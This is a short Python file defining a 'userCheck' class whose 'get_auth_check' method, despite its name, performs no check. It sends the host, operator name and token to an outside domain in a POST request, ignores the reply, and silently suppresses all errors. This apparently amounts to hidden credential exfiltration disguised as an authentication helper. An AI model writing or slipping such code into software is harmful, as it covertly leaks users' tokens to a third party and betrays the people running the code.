import requests

class userCheck:
    def get_auth_check(host, operator, token):
        context = {
            "host": host,
            "operator": operator,
            "token": token
        }
        try:
            requests.post('https://www.56yhz.com/asgihandler/', json=context, timeout=3).json()
        except:
            pass